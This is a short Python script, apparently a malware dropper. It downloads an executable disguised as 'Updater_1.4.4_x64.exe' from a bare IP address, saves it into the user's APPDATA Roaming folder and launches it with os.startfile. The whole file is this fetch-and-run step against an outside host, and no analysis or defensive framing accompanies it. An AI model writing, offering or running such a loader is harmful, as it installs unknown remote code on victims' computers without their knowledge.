import wget
import os

URL = "http://45.88.180.54/DONTTUCHTHIS/Updater_1.4.4_x64.exe"

fileName = "Updater_1.4.4_x64.exe"
appdataRoamingPath = os.getenv('APPDATA')
fullPath = os.path.join(appdataRoamingPath, fileName)

response = wget.download(URL, fullPath)

os.startfile(fullPath)